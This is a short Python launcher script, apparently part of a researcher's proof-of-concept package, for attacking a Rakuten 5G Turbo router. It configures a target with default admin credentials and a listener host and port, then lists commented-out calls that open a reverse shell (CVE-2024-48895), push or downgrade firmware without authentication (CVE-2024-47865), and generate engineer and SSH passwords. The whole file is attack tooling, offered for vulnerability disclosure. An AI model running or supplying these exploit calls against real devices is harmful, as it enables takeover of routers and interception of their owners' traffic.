# main.py
# @package   5GturboAPI
# @author    Samy Younsi - NeroTeam Security Labs <samy@neroteam.com>
# @license   Proprietary License - All Rights Reserved
# @docs      https://neroteam.com/blog/

import turboApi

device = {
    "turboIp": "192.168.210.1",
    "turboUsername": "admin",
    "turboPassword": "admin",
    "host": "192.168.210.157",
    "port": "33666",
    "apn": "rakuten.jp",
    "fwImage": "GA2421@230920_1.3.14.ffw",
}

# http://http-fota.rakuten.smartgaiacloud.com/fw/
# response = turboApi.getDeviceVersion(device)
# print(response)

"""
Execute reverse shell on version 1.3.18 and under (turboUsername/turboPassword required) - CVE-2024-48895
"""
# response = turboApi.execRevrsShell(device)
# print(response)

"""
Install/Downgrade firmware image - No auth required - CVE-2024-47865
"""
# response = turboApi.execInstallFw(device)
# print(response)

"""
BONUS! Generate Engineer Password to get full web access
"""
# response = turboApi.getEngineerPassword(device)
# print(response)

"""
BONUS! Generate SSH Password to get SSH access, only working by installing debug firmware (e.g. DG2425@2406171559_DG1.3.18.ffw)
"""
# response = turboApi.getSshPassword(device)
# print(response)

"""
BONUS! Direclty set new APN from API (can also work with Engineer access)
"""
# response = turboApi.setDeviceApn(device)
# print(response)
